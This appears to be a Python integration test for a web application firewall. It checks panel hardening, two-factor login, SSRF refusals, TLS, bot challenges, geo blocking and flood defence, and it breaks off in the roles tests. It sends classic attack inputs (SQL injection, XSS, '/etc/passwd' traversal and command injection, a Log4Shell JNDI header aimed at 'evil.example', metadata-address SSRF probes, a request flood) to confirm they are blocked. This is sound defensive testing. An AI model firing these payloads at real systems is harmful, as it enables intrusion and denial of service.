"""ShieldWAF 2.0 functional + security test (panel https on :19000, proxy http :18088, proxy https :18443). Throwaway random passwords, never printed."""
import base64
import hashlib
import hmac
import http.cookiejar
import json
import re
import secrets
import ssl
import struct
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

NS = "shieldwaf-test"
PANEL, PROXY, TLSPORT = "https://127.0.0.1:19000", "http://127.0.0.1:18088", 18443
results = []
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE


def check(name, cond, extra=""):
    results.append((name, bool(cond)))
    print(("PASS  " if cond else "FAIL  ") + name + (f"   [{extra}]" if extra and not cond else ""))


class Panel:
    def __init__(self):
        self.jar = http.cookiejar.CookieJar()
        self.op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.jar), urllib.request.HTTPSHandler(context=CTX))
        self.last_headers = {}

    def req(self, path, data=None):
        body = urllib.parse.urlencode(data, doseq=True).encode() if data is not None else None
        try:
            r = self.op.open(urllib.request.Request(PANEL + path, data=body), timeout=90)
            self.last_headers = dict(r.headers)
            return r.status, r.read().decode("utf-8", "replace"), r.geturl()
        except urllib.error.HTTPError as e:
            self.last_headers = dict(e.headers)
            return e.code, e.read().decode("utf-8", "replace"), PANEL + path

    @staticmethod
    def token(html):
        m = re.search(r'name="_csrf" value="([0-9a-f]+)"', html)
        return m.group(1) if m else ""

    def post(self, path, fields, page="/dashboard"):
        _, html, _ = self.req(page)
        d = dict(fields)
        d["_csrf"] = self.token(html)
        return self.req(path, d)

    def cookie_header(self):
        return "; ".join(f"{c.name}={c.value}" for c in self.jar)


def totp(secret, step=None):
    key = base64.b32decode(secret + "=" * (-len(secret) % 8))
    step = step or int(time.time() // 30)
    mac = hmac.new(key, struct.pack(">Q", step), hashlib.sha1).digest()
    o = mac[-1] & 15
    return "%06d" % ((struct.unpack(">I", mac[o:o + 4])[0] & 0x7FFFFFFF) % 1000000)


def proxy(host, path="/", headers=None, method="GET", data=None, retry=True):
    if retry:
        for _t in range(4):
            r = proxy(host, path, headers, method, data, retry=False)
            if r[0] != 0:
                return r
            time.sleep(1.5)
        return r
    h = {"Host": host}
    h.update(headers or {})
    try:
        r = urllib.request.urlopen(urllib.request.Request(PROXY + path, headers=h, method=method, data=data), timeout=30)
        return r.status, r.read().decode("utf-8", "replace"), dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), dict(e.headers)
    except Exception as e:  # noqa: BLE001
        return 0, str(e), {}


def curl_ok(args, timeout=30):
    for _t in range(8):
        rc, out = curl(args, timeout)
        if out.strip() and not out.strip().startswith("|"):
            return rc, out
        time.sleep(2)
    return rc, out


def curl(args, timeout=30):
    r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args, capture_output=True, text=True)
    return r.returncode, r.stdout


def site_form(host, upstream, **kw):
    f = {"host": host, "upstream": upstream, "enabled": "on", "mode": "block", "paranoia": "1", "threshold": "5", "max_body_mb": "10",
         "down_page": "on", "block_bots": "on", "sec_headers": "on", "rl_rps": "10", "rl_burst": "20",
         "methods": ["GET", "HEAD", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"], "tls_source": "selfsigned", "tls_hsts_days": "365",
         "auth_realm": "Restricted", "chal_difficulty": "4", "chal_ttl": "12", "chal_scope": "pages"}
    f.update(kw)
    return {k: v for k, v in f.items() if v is not None}


NOTES = "http://demo-notes.shieldwaf-demo.svc.cluster.local:80"
PY = "http://demo-python.shieldwaf-demo.svc.cluster.local:80"
P = Panel()

# ================================================================= panel transport + headers
rc, out = curl(["--max-time", "5", "http://127.0.0.1:19000/healthz"])
check("panel refuses plain HTTP (TLS only)", rc != 0 or "ok" not in out, f"rc={rc} out={out[:40]}")
s, html, _ = P.req("/setup")
h = P.last_headers
check("panel sends CSP without unsafe-inline scripts", "script-src 'self'" in h.get("Content-Security-Policy", "") and "script-src 'self' 'unsafe-inline'" not in h.get("Content-Security-Policy", ""))
check("panel sends HSTS, X-Frame-Options DENY, nosniff", "max-age" in h.get("Strict-Transport-Security", "") and h.get("X-Frame-Options") == "DENY" and h.get("X-Content-Type-Options") == "nosniff")
ck = [c for c in P.jar]
check("session cookie is __Host- prefixed, Secure, HttpOnly, SameSite=Strict", any(c.name == "__Host-shieldwaf" and c.secure for c in ck) and "HttpOnly" in str(h.get("Set-Cookie", "")) and "SameSite=Strict" in str(h.get("Set-Cookie", "")), str(h.get("Set-Cookie", ""))[:120])

# ================================================================= setup + password policy
code = re.search(r"Setup code: (\w+)", subprocess.run(["kubectl", "-n", NS, "logs", "deploy/shieldwaf-test", "-c", "panel"], capture_output=True, text=True).stdout).group(1)
PW = secrets.token_urlsafe(16) + "aA1!"
for label, pw in (("short", "Ab1!short"), ("no variety", "alllowercaseletters"), ("contains username", "tester-Pass-1234!")):
    s, html, _ = P.req("/setup")
    s, html, _ = P.req("/setup", {"_csrf": P.token(html), "code": code, "username": "tester", "password": pw, "password2": pw})
    check(f"setup rejects weak password ({label})", "First-time setup" in html and ("least 12" in html or "three of" in html or "must not contain" in html), html[:0])
s, html, _ = P.req("/setup")
s, html, _ = P.req("/setup", {"_csrf": P.token(html), "code": "0000bad0", "username": "tester", "password": PW, "password2": PW})
check("setup rejects a wrong setup code", "Wrong setup code" in html)
s, html, _ = P.req("/setup")
s, html, url = P.req("/setup", {"_csrf": P.token(html), "code": code, "username": "tester", "password": PW, "password2": PW})
check("setup creates the admin (strong password) and logs in", "Dashboard" in html and "Two-factor login is not enabled" in html, url)
s, _, _ = P.req("/sites/new", {"host": "x"})
check("POST without CSRF token refused (400)", s == 400, s)

# ================================================================= lockout (uses a different user name so the real admin is not locked)
codes = []
for i in range(6):
    s, html, _ = P.req("/login")
    s, html, _ = P.req("/login", {"_csrf": P.token(html), "username": "intruder", "password": "wrong-password-%d" % i})
    codes.append(s)
check("login: wrong passwords get 401, then the account/IP is locked (429)", codes[:5] == [401] * 5 and codes[5] == 429, str(codes))

# ================================================================= 2FA
s, html, _ = P.post("/security", {"act": "start"}, "/security")
sec = re.search(r'user-select:all">([A-Z2-7]{32})<', html)
check("2FA setup shows a secret key", bool(sec), html[:0])
secret = sec.group(1)
s, html, _ = P.post("/security", {"act": "enable", "code": "000000"}, "/security")
check("2FA enable rejects a wrong code", "not valid" in html)
s, html, _ = P.post("/security", {"act": "enable", "code": totp(secret)}, "/security")
rec = re.findall(r"\b([0-9a-f]{10})<br>", html)
check("2FA enabled and 8 one-time recovery codes shown", len(rec) == 8, str(len(rec)))
old_cookie = P.cookie_header()
P.post("/logout", {})
s, html, url = P.req("/dashboard")
check("after logout the panel needs login again", "Sign in" in html)
# the old session cookie must be dead (server-side revocation)
chk = subprocess.run(["curl", "-s", "-k", "-m", "20", "-H", "Cookie: " + old_cookie, "-o", "/dev/null", "-w", "%{http_code} %{redirect_url}", PANEL + "/dashboard"], capture_output=True, text=True).stdout
check("a stolen/old session cookie no longer works after logout", chk.startswith("302"), chk)

s, html, _ = P.req("/login")
s, html, _ = P.req("/login", {"_csrf": P.token(html), "username": "tester", "password": PW})
check("login with password asks for the 2FA code", "Two-factor code" in html)
s, html, _ = P.req("/login/2fa", {"_csrf": P.token(html), "code": "123456"})
check("wrong 2FA code refused", "Wrong code" in html)
step = int(time.time() // 30)
good = totp(secret, step)
for _off in (1, 2, 0):          # the cluster's clock can differ from this computer's by a few seconds: try the neighbouring 30-second steps
    s, html, _ = P.req("/login/2fa", {"_csrf": P.token(html), "code": totp(secret, step + _off)})
    good = totp(secret, step + _off)
    if "Dashboard" in html:
        break
check("correct 2FA code logs in", "Dashboard" in html and "Two-factor login is not enabled" not in html, html[:0])
P.post("/logout", {})
s, html, _ = P.req("/login")
s, html, _ = P.req("/login", {"_csrf": P.token(html), "username": "tester", "password": PW})
s, html, _ = P.req("/login/2fa", {"_csrf": P.token(html), "code": good})
check("the same 2FA code cannot be replayed", "Wrong code" in html)
s, html, _ = P.req("/login/2fa", {"_csrf": P.token(html), "code": rec[0]})
check("a recovery code logs in once", "Dashboard" in html)
P.post("/logout", {})
s, html, _ = P.req("/login")
s, html, _ = P.req("/login", {"_csrf": P.token(html), "username": "tester", "password": PW})
s, html, _ = P.req("/login/2fa", {"_csrf": P.token(html), "code": rec[0]})
check("a used recovery code is dead", "Wrong code" in html)
s, html, _ = P.req("/login/2fa", {"_csrf": P.token(html), "code": rec[2]})
check("login again with another recovery code", "Dashboard" in html, html[:0])

# ================================================================= settings: allow-list, metrics token, SSRF
base = {"ab_threshold": "5", "ab_window": "5", "ab_ban": "30", "retention": "7", "idle": "30", "never_ban": "127.0.0.1", "trusted_proxies": "", "panel_allow_ips": "", "upstream_allow": "", "dd_rps": "200", "dd_window": "20", "dd_hold": "15"}
s, html, _ = P.post("/settings", dict(base, panel_allow_ips="203.0.113.0/24"), "/settings")
check("panel allow-list that would lock the admin out is refused", "locked out" in html)
s, _, _ = P.req("/metrics")
check("/metrics without token is refused (401)", s == 401, s)
s, html, _ = P.post("/settings/metrics-token", {}, "/settings")
tok = re.search(r"New metrics token: ([\w-]+)", html)
check("metrics token can be generated", bool(tok))
r = subprocess.run(["curl", "-s", "-k", "-m", "20", "-H", "Authorization: Bearer " + tok.group(1), PANEL + "/metrics"], capture_output=True, text=True).stdout
check("/metrics works with the bearer token", "shieldwaf_engine_up" in r, r[:60])

for label, up in (("loopback (the panel itself)", "http://127.0.0.1:9000"), ("cloud metadata address", "http://169.254.169.254"), ("localhost name", "http://localhost:8080"),
                  ("GCP metadata name", "http://metadata.google.internal")):
    s, html, _ = P.post("/sites/new", site_form("ssrf.shield.test", up, tls_source="none"), "/sites/new")
    check(f"SSRF: upstream {label} refused", "not allowed" in html, re.sub(r"<[^>]+>", " ", html)[200:320])
s, html, _ = P.post("/settings", dict(base, upstream_allow="svc.cluster.local"), "/settings")
s, html, _ = P.post("/sites/new", site_form("ext.shield.test", "http://example.com", tls_source="none"), "/sites/new")
check("upstream allow-list: a host outside the allowed suffix is refused", "not in the allowed list" in html)
P.post("/settings", base, "/settings")

# ================================================================= sites
ids = {}
for host, up, kw in (("notes.shield.test", NOTES, {}), ("py.shield.test", PY, {}), ("down.shield.test", "http://no-such-service.shieldwaf-test.svc.cluster.local:80", {}),
                     ("detect.shield.test", NOTES, {"mode": "detect"})):
    kw = dict(kw, tls_source="none")
    s, html, _ = P.post("/sites/new", site_form(host, up, **kw), "/sites/new")
    check(f"add site {host}", "site added" in html and "applied and reloaded" in html, re.sub(r"<[^>]+>", " ", html)[250:420] if "site added" not in html else "")
html = P.req("/sites")[1]
for m in re.finditer(r"<td><b>([\w.-]+)</b>.*?/sites/(s[0-9a-f]+)\"", html, re.S):
    ids.setdefault(m.group(1), m.group(2))
time.sleep(3)

# ================================================================= WAF + hardening on the proxy
st, body, hd = proxy("notes.shield.test", "/health")
check("normal request reaches the notes app", st == 200 and '"status"' in body, f"{st}")
check("Server header does not reveal nginx", "nginx" not in hd.get("Server", "").lower() and not re.search(r"\d+\.\d+", hd.get("Server", "")), hd.get("Server", ""))
for name, path, hdrs in (("SQL injection", "/?" + urllib.parse.urlencode({"id": "1' OR '1'='1"}), {}), ("XSS", "/?" + urllib.parse.urlencode({"q": "<script>alert(1)</script>"}), {}),
                         ("file inclusion", "/?" + urllib.parse.urlencode({"file": "../../../../etc/passwd"}), {}), ("command injection", "/?" + urllib.parse.urlencode({"cmd": ";cat /etc/passwd"}), {}),
                         ("Log4Shell header", "/", {"X-Api-Version": "${jndi:ldap://evil.example/a}"}), ("scanner user-agent", "/", {"User-Agent": "sqlmap/1.7"})):
    st, _, _ = proxy("notes.shield.test", path, hdrs)
    check(f"{name} blocked (403)", st == 403, st)
st, _, _ = proxy("unknown.shield.test", "/", retry=False)
check("unknown host name: connection closed without a reply (444)", st == 0, st)
st, _, _ = proxy("notes.shield.test", "/", headers={"X-Big": "A" * 20000})
check("oversized request header rejected", st in (400, 431, 494), st)
st, _, _ = proxy("notes.shield.test", "/health", method="TRACE")
check("TRACE method refused (405)", st == 405, st)
f = site_form("notes.shield.test", NOTES, tls_source="none", methods=["GET", "HEAD"])
P.post("/sites/%s" % ids["notes.shield.test"], f, "/sites/%s" % ids["notes.shield.test"])
time.sleep(3)
st, _, _ = proxy("notes.shield.test", "/health", method="POST", data=b"x=1")
check("method allow-list: POST refused when only GET/HEAD allowed (405)", st == 405, st)
f = site_form("notes.shield.test", NOTES, tls_source="none", deny_ips="203.0.113.5")
P.post("/sites/%s" % ids["notes.shield.test"], f, "/sites/%s" % ids["notes.shield.test"])
time.sleep(3)
st, _, _ = proxy("notes.shield.test", "/health", headers={"X-Forwarded-For": "203.0.113.5"})
check("spoofed X-Forwarded-For is ignored (deny-listed IP in the header still gets 200)", st == 200, st)
base_tp = dict(base, trusted_proxies="127.0.0.1")
P.post("/settings", base_tp, "/settings")
time.sleep(3)
st, _, _ = proxy("notes.shield.test", "/health", headers={"X-Forwarded-For": "203.0.113.5"})
check("...but honoured once 127.0.0.1 is a trusted proxy (403)", st == 403, st)
P.post("/settings", base, "/settings")
f = site_form("notes.shield.test", NOTES, tls_source="none")
P.post("/sites/%s" % ids["notes.shield.test"], f, "/sites/%s" % ids["notes.shield.test"])

# ================================================================= TLS
f = site_form("tls.shield.test", NOTES, tls_enabled="on", tls_source="selfsigned", tls_redirect="on", tls_redirect_port=str(TLSPORT), tls_hsts="on", tls_generate="on")
s, html, _ = P.post("/sites/new", f, "/sites/new")
check("add TLS site with a generated self-signed certificate", "site added" in html, re.sub(r"<[^>]+>", " ", html)[250:400] if "site added" not in html else "")
time.sleep(3)
for _try in range(15):
    rc, out = curl(["--resolve", f"tls.shield.test:{TLSPORT}:127.0.0.1", f"https://tls.shield.test:{TLSPORT}/health", "-D", "-", "-o", "/dev/null"])
    if out.strip():
        break
    time.sleep(2)
check("HTTPS works and sends HSTS", "200" in out.splitlines()[0] and "strict-transport-security" in out.lower(), out[:120])
rc, out = curl(["--resolve", f"tls.shield.test:{TLSPORT}:127.0.0.1", "--tls-max", "1.1", f"https://tls.shield.test:{TLSPORT}/health"])
check("TLS 1.1 is refused", rc != 0 or "status" not in out, f"rc={rc}")
rc, out = curl_ok(["--tlsv1.3", "--resolve", f"tls.shield.test:{TLSPORT}:127.0.0.1", f"https://tls.shield.test:{TLSPORT}/health"])
check("TLS 1.3 works", '"status"' in out, out[:60])
rc, out = curl(["--resolve", f"nope.shield.test:{TLSPORT}:127.0.0.1", f"https://nope.shield.test:{TLSPORT}/"])
check("TLS handshake for an unknown host name is rejected", rc != 0 and not out)
rc, out = curl(["-D", "-", "-o", "/dev/null", "-H", "Host: tls.shield.test", "http://127.0.0.1:18088/health?x=1"])
loc = re.search(r"(?im)^location:\s*(\S+)", out)
check("HTTP is redirected to HTTPS (301, with the public port)", out.startswith("HTTP/1.1 301") and loc and loc.group(1).startswith(f"https://tls.shield.test:{TLSPORT}/health"), out[:100])
# uploaded certificate: generate a pair locally, then mismatching key, then correct
import os, shutil, tempfile
OPENSSL = shutil.which("openssl")
def make_pair(cn):
    t = tempfile.mkdtemp()
    k, c = os.path.join(t, "k.pem"), os.path.join(t, "c.pem")
    subprocess.run([OPENSSL, "req", "-x509", "-newkey", "ec", "-pkeyopt", "ec_paramgen_curve:prime256v1", "-nodes", "-days", "30", "-subj", "/CN=" + cn, "-keyout", k, "-out", c], capture_output=True, check=True)
    return open(c).read(), open(k).read()
cert_pem, key_pem = make_pair("up.shield.test")
_, other_key = make_pair("other")
f = site_form("up.shield.test", NOTES, tls_enabled="on", tls_source="uploaded", tls_redirect="on", cert_pem=cert_pem, key_pem=other_key)
s, html, _ = P.post("/sites/new", f, "/sites/new")
check("uploaded certificate with a non-matching key is refused", "does not match" in html)
f = site_form("up.shield.test", NOTES, tls_enabled="on", tls_source="uploaded", tls_redirect="on", cert_pem=cert_pem, key_pem=key_pem)
s, html, _ = P.post("/sites/new", f, "/sites/new")
check("uploaded certificate + matching key accepted", "site added" in html, re.sub(r"<[^>]+>", " ", html)[250:400] if "site added" not in html else "")
rc, out = curl_ok(["--resolve", f"up.shield.test:{TLSPORT}:127.0.0.1", f"https://up.shield.test:{TLSPORT}/health", "-w", "|%{ssl_verify_result}"])
check("uploaded certificate is the one served", '"status"' in out, out[:80])
s, html, _ = P.req("/sites")
keybody = key_pem.splitlines()[1]
check("private keys are never shown in the GUI", keybody not in html and keybody not in P.req("/sites/%s" % re.search(r"<b>up.shield.test</b>.*?/sites/(s[0-9a-f]+)\"", html, re.S).group(1))[1])

# ================================================================= login gate
GU, GP = "gate_user", secrets.token_urlsafe(14)
f = site_form("gate.shield.test", NOTES, tls_source="none", auth_enabled="on", auth_realm="Staff only", auth_user_new=GU, auth_pass_new=GP)
s, html, _ = P.post("/sites/new", f, "/sites/new")
check("add site with a login gate", "site added" in html, re.sub(r"<[^>]+>", " ", html)[250:400] if "site added" not in html else "")
time.sleep(3)
st, _, hd = proxy("gate.shield.test", "/health")
check("login gate: no credentials -> 401 with realm", st == 401 and "Staff only" in hd.get("WWW-Authenticate", ""), f"{st}")
bad = base64.b64encode(f"{GU}:wrong".encode()).decode()
st, _, _ = proxy("gate.shield.test", "/health", headers={"Authorization": "Basic " + bad})
check("login gate: wrong password -> 401", st == 401, st)
good_b = base64.b64encode(f"{GU}:{GP}".encode()).decode()
st, body, _ = proxy("gate.shield.test", "/health", headers={"Authorization": "Basic " + good_b})
check("login gate: right credentials -> app", st == 200 and '"status"' in body, st)
f = site_form("gate.shield.test", NOTES, tls_source="none", auth_enabled="on", auth_user_new="gate2", auth_pass_new="short")
s, html, _ = P.post("/sites/%s" % [v for k, v in ids.items()][0] if False else "/sites/new", f, "/sites/new")
check("login gate password shorter than 10 is refused", "at least 10" in html)

# ================================================================= anti-bot challenge
f = site_form("chal.shield.test", NOTES, tls_source="none", chal_enabled="on", chal_difficulty="4", chal_exclude="/health")
s, html, _ = P.post("/sites/new", f, "/sites/new")
check("add site with the anti-bot challenge", "site added" in html, re.sub(r"<[^>]+>", " ", html)[250:400] if "site added" not in html else "")
time.sleep(3)
UA = {"User-Agent": "Mozilla/5.0 (test)", "Accept": "text/html"}
st, body, hd = proxy("chal.shield.test", "/", UA)
check("challenge: a browser page load without a pass gets the challenge page", st == 200 and hd.get("X-Shield-Challenge") == "1" and "Checking your browser" in body, f"{st}")
seed = re.search(r'seed = "([0-9.a-f]+)"', body).group(1)
nonce = 0
while not hashlib.sha256(f"{seed}:{nonce}".encode()).hexdigest().startswith("0000"):
    nonce += 1
st, _, hd = proxy("chal.shield.test", f"/__shield/verify?seed={seed}&nonce={nonce}", UA)
cookie = (hd.get("Set-Cookie", "").split(";")[0])
check("challenge: correct proof of work is accepted (204 + signed cookie)", st == 204 and cookie.startswith("__shield_ok="), f"{st}")
st, body, _ = proxy("chal.shield.test", "/", dict(UA, Cookie=cookie))
check("challenge: with the pass the real app is served", st == 200 and "Checking your browser" not in body, st)
st, body, hd = proxy("chal.shield.test", "/", dict(UA, Cookie=cookie, **{"User-Agent": "Different-Browser/1.0"}))
check("challenge: the pass is bound to the browser (other User-Agent is challenged again)", hd.get("X-Shield-Challenge") == "1", st)
forged = "__shield_ok=%d.%s" % (int(time.time()) + 99999, "0" * 64)
st, body, hd = proxy("chal.shield.test", "/", dict(UA, Cookie=forged))
check("challenge: a forged cookie is rejected", hd.get("X-Shield-Challenge") == "1")
st, _, _ = proxy("chal.shield.test", f"/__shield/verify?seed={seed}&nonce={nonce + 1}", UA)
check("challenge: a wrong nonce is refused (403)", st == 403, st)
st, _, _ = proxy("chal.shield.test", "/__shield/verify?seed=123.abc&nonce=1", UA)
check("challenge: a forged seed is refused", st in (403, 410, 400), st)
st, body, hd = proxy("chal.shield.test", "/health", {"User-Agent": "curl/8", "Accept": "*/*"})
check("challenge (scope pages): API/non-browser requests are not challenged", st == 200 and hd.get("X-Shield-Challenge") is None, st)
f = site_form("chal.shield.test", NOTES, tls_source="none", chal_enabled="on", chal_difficulty="4", chal_scope="all", chal_exclude="/health")
cid = re.search(r"<b>chal.shield.test</b>.*?/sites/(s[0-9a-f]+)\"", P.req("/sites")[1], re.S).group(1)
P.post("/sites/%s" % cid, f, "/sites/%s" % cid)
time.sleep(3)
st, body, hd = proxy("chal.shield.test", "/api/notes", {"User-Agent": "curl/8", "Accept": "application/json"})
check("challenge (scope all): even API requests are challenged", hd.get("X-Shield-Challenge") == "1", st)
st, body, hd = proxy("chal.shield.test", "/health", {"User-Agent": "curl/8", "Accept": "application/json"})
check("challenge (scope all): excluded paths still work", st == 200 and hd.get("X-Shield-Challenge") is None, st)

# ================================================================= existing features still work
st, body, _ = proxy("down.shield.test", "/")
check("service-down page appears when the app is unreachable", "getting back up" in body.lower() and st in (502, 503, 504), st)
P.post("/sites/%s/maintenance" % ids["py.shield.test"], {"state": "on"}, "/sites")
time.sleep(3)
st, body, _ = proxy("py.shield.test", "/")
check("maintenance ON gives 503 + page", st == 503 and "back soon" in body.lower(), st)
P.post("/sites/%s/maintenance" % ids["py.shield.test"], {"state": "off"}, "/sites")
time.sleep(3)
st, _, _ = proxy("py.shield.test", "/")
check("maintenance OFF restores the app", st in (200, 302), st)
st, _, _ = proxy("detect.shield.test", "/health?" + urllib.parse.urlencode({"id": "1' OR '1'='1"}))
check("detect-only site lets the attack through", st == 200, st)
f = site_form("notes.shield.test", NOTES, tls_source="none", rl_enabled="on", rl_rps="2", rl_burst="2")
P.post("/sites/%s" % ids["notes.shield.test"], f, "/sites/%s" % ids["notes.shield.test"])
time.sleep(3)
codes = [proxy("notes.shield.test", "/health")[0] for _ in range(25)]
check("rate limiting returns 429", 429 in codes and 200 in codes, str(sorted(set(codes))))

# ================================================================= NEW in 2.1: positive model, threat feeds, countries, under-attack, roles
def settings_post(**over):
    d = dict(base, trusted_proxies="127.0.0.1")
    d.update(over)
    return P.post("/settings", d, "/settings")


# ---- positive security model
f = site_form("pos.shield.test", NOTES, tls_source="none", pos_enabled="on", pos_paths="=/\n=/health\n/api/", pos_types="application/json", pos_max_url="200")
s, html, _ = P.post("/sites/new", f, "/sites/new")
check("add site with the positive security model", "site added" in html, re.sub(r"<[^>]+>", " ", html)[250:420] if "site added" not in html else "")
f2 = site_form("pos2.shield.test", NOTES, tls_source="none", pos_enabled="on", pos_paths="", pos_types="application/json")
s, html, _ = P.post("/sites/new", f2, "/sites/new")
check("positive model without any allowed path is refused", "list at least one allowed path" in html)
time.sleep(3)
st, body, _ = proxy("pos.shield.test", "/health")
check("positive model: a listed path works", st == 200 and '"status"' in body, st)
st, _, _ = proxy("pos.shield.test", "/admin/secret")
check("positive model: an unlisted path is refused (403)", st == 403, st)
st, _, _ = proxy("pos.shield.test", "/healthz-extra")
check("positive model: prefix rules do not match look-alike paths (exact entry)", st == 403, st)
st, _, _ = proxy("pos.shield.test", "/api/notes", method="POST", data=b"<a/>", headers={"Content-Type": "text/xml"})
check("positive model: a content type that is not allowed gets 415", st == 415, st)
st, _, _ = proxy("pos.shield.test", "/api/notes", method="POST", data=b'{"title":"hello","body":"world"}', headers={"Content-Type": "application/json"})
check("positive model: an allowed content type passes", st not in (403, 414, 415), st)
st, _, _ = proxy("pos.shield.test", "/api/" + "a" * 300)
check("positive model: an over-long URL gets 414", st == 414, st)

# ---- reputation feeds (real download from the internet)
s, html, _ = P.post("/intel", {"act": "add", "name": "bad", "url": "http://example.org/list.txt"}, "/intel")
check("custom feed: plain http is refused", "must start with https" in html)
s, html, _ = P.post("/intel", {"act": "add", "name": "bad", "url": "https://localhost/list.txt"}, "/intel")
check("custom feed: a host that resolves to a private address is refused", "private or reserved" in html or "does not resolve" in html, re.sub(r"<[^>]+>", " ", html)[250:380])
P.post("/intel", {"act": "refresh"}, "/intel")
got = False
for _t in range(60):
    time.sleep(3)
    page = P.req("/intel")[1]
    if re.search(r"(\d+) networks", page):
        got = True
        break
check("threat feeds download and load (Spamhaus DROP + FireHOL level 1)", got)
listed_ip = None
if got:
    first = subprocess.run(["kubectl", "-n", NS, "exec", "deploy/shieldwaf-test", "-c", "panel", "--", "sh", "-c", "head -1 /data/feeds/feed.geo"], capture_output=True, text=True).stdout.split()[0]
    import ipaddress as _ip
    listed_ip = str(next(_ip.ip_network(first).hosts()))
    settings_post()
    time.sleep(4)
    st, _, _ = proxy("notes.shield.test", "/health", headers={"X-Forwarded-For": listed_ip})
    check("an address on the reputation list is refused (403)", st == 403, f"{listed_ip} -> {st}")
    st, _, _ = proxy("notes.shield.test", "/health", headers={"X-Forwarded-For": "9.9.9.9"})
    check("an address that is not listed passes", st == 200, st)
    page = P.req("/intel?ip=" + listed_ip)[1]
    check("lookup tool reports the listed address", "listed in" in page, "")
    # private ranges must never be loaded from a feed
    pf = subprocess.run(["kubectl", "-n", NS, "exec", "deploy/shieldwaf-test", "-c", "panel", "--", "sh", "-c",
                         "grep -E '^ +(10\\.|192\\.168\\.|127\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|0\\.)' /data/feeds/feed.geo | head -3"], capture_output=True, text=True).stdout.strip()
    check("private / reserved ranges are never taken from a feed", pf == "", pf)
else:
    check("(feed tests skipped: no download)", False)

# ---- country rules (registry data)
P.post("/intel", {"act": "geo"}, "/intel")
ready = False
for _t in range(90):
    time.sleep(4)
    page = P.req("/intel")[1]
    if "countries," in page and "downloading" not in page:
        ready = True
        break
check("country data downloads from the five registries", ready, re.sub(r"<[^>]+>", " ", page)[400:700] if not ready else "")
if ready:
    page = P.req("/intel?ip=8.8.8.8")[1]
    check("lookup tool knows the registered country of 8.8.8.8 (US)", "<b>US</b>" in page, "")
    settings_post()
    f = site_form("geo.shield.test", NOTES, tls_source="none", geo_mode="deny", geo_countries="AU CN")
    s, html, _ = P.post("/sites/new", f, "/sites/new")
    check("add site that blocks countries", "site added" in html, re.sub(r"<[^>]+>", " ", html)[250:420] if "site added" not in html else "")
    time.sleep(4)
    st, _, _ = proxy("geo.shield.test", "/health", headers={"X-Forwarded-For": "1.1.1.1"})
    check("country deny: an address registered in AU is refused", st == 403, st)
    st, _, _ = proxy("geo.shield.test", "/health", headers={"X-Forwarded-For": "8.8.8.8"})
    check("country deny: an address registered in the US passes", st == 200, st)
    gid = re.search(r"<b>geo.shield.test</b>.*?/sites/(s[0-9a-f]+)\"", P.req("/sites")[1], re.S).group(1)
    f = site_form("geo.shield.test", NOTES, tls_source="none", geo_mode="allow", geo_countries="US")
    P.post("/sites/%s" % gid, f, "/sites/%s" % gid)
    time.sleep(4)
    st1, _, _ = proxy("geo.shield.test", "/health", headers={"X-Forwarded-For": "8.8.8.8"})
    st2, _, _ = proxy("geo.shield.test", "/health", headers={"X-Forwarded-For": "1.1.1.1"})
    st3, _, _ = proxy("geo.shield.test", "/health", headers={"X-Forwarded-For": "10.1.2.3"})
    check("country allow-list: US passes, AU refused, private network still allowed", (st1, st2, st3) == (200, 403, 200), str((st1, st2, st3)))
    f = site_form("geo.shield.test", NOTES, tls_source="none", geo_mode="deny", geo_countries="XX1")
    s, html, _ = P.post("/sites/%s" % gid, f, "/sites/%s" % gid)
    check("invalid country codes are refused", "two-letter codes" in html)
settings_post(trusted_proxies="")

# ---- under-attack mode (manual) and automatic escalation
nid = re.search(r"<b>notes.shield.test</b>.*?/sites/(s[0-9a-f]+)\"", P.req("/sites")[1], re.S).group(1)
P.post("/sites/%s/under-attack" % nid, {"state": "on"}, "/sites")
time.sleep(4)
st, body, hd = proxy("notes.shield.test", "/api/notes", {"User-Agent": "curl/8", "Accept": "application/json"})
check("under attack (manual): even API clients must pass the challenge", hd.get("X-Shield-Challenge") == "1", st)
st, body, hd = proxy("notes.shield.test", "/", {"User-Agent": "Mozilla/5.0", "Accept": "text/html"})
check("under attack (manual): browsers get the challenge page", hd.get("X-Shield-Challenge") == "1" and "Checking your browser" in body, st)
P.post("/sites/%s/under-attack" % nid, {"state": "off"}, "/sites")
time.sleep(4)
st, _, hd = proxy("notes.shield.test", "/health")
check("under attack OFF: normal again", st == 200 and hd.get("X-Shield-Challenge") is None, st)
settings_post(trusted_proxies="", dd_auto="on", dd_rps="10", dd_window="5", dd_hold="1")
time.sleep(2)
FLOOD = 'for b in 1 2 3 4 5 6; do for i in $(seq 1 40); do wget -q -O /dev/null -T 3 --header "Host: notes.shield.test" http://127.0.0.1:8080/health & done; wait; done'
subprocess.run(["kubectl", "-n", NS, "exec", "deploy/shieldwaf-test", "-c", "engine", "--", "sh", "-c", FLOOD], capture_output=True, text=True, timeout=120)
auto = False
for _t in range(25):
    time.sleep(3)
    if "auto under-attack" in P.req("/audit")[1]:
        auto = True
        break
check("flood defence: a request flood switches under-attack mode on automatically", auto)
time.sleep(4)
st, body, hd = proxy("notes.shield.test", "/api/notes", {"User-Agent": "curl/8", "Accept": "application/json"})
check("flood defence: the flooded site now demands the challenge", hd.get("X-Shield-Challenge") == "1", st)
settings_post(trusted_proxies="")          # auto off -> the automatic episode is ended
for _t in range(15):
    time.sleep(3)
    st, _, hd = proxy("notes.shield.test", "/health")
    if st == 200 and hd.get("X-Shield-Challenge") is None:
        break
check("flood defence: turning the auto mode off ends the automatic episode", st == 200 and hd.get("X-Shield-Challenge") is None, st)

# ---- roles
VPW = secrets.token_urlsafe(14) + "vV3#"
s, html, _ = P.post("/users", {"act": "add", "name": "reader", "password": "weak", "role": "viewer"}, "/users")
check("users: a weak temporary password is refused", "least 12" in html or "three of" in html)
s, html, _ = P.post("/users", {"act": "add", "name": "reader", "password": VPW, "role": "viewer"}, "/users")
check("users: administrator can create a viewer", "User reader created" in html, re.sub(r"<[^>]+>", " ", html)[250:400])
V = Panel()
s, html, _ = V.req("/login")
s, html, url = V.req("/login", {"_csrf": V.token(html), "username": "reader", "password": VPW})
s, html, url = V.req("/dashboard")
